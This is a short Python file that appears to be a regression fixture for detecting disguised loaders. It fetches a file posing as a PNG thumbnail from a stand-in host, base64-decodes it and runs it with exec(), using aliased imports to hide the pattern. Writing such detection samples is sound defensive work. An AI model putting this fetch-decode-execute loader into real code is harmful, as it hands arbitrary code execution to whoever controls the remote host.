# Regression variant of imagejpeg: renamed imports and an unrelated endpoint.
# Static fixture only; never execute.
import requests as client
import base64 as codec
STAGE = "https://cdn.example.net/v3/thumbnail.png?revision=8"
response = client.get(STAGE)
packed = codec.b64decode(response.content)
exec(packed)
